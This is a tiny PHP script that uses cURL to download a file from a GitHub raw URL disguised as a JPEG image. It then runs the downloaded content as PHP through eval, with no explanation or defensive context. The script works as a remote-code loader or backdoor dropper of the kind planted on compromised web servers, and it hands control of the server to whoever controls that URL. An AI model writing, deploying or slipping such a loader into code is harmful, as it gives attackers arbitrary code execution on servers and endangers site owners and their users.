<?php
$url = "https://raw.githubusercontent.com/player370123/broadcast/main/harimaw.jpeg";

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$code = curl_exec($ch);
if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
} else {
    eval("?>$code");
}
curl_close($ch);
?>
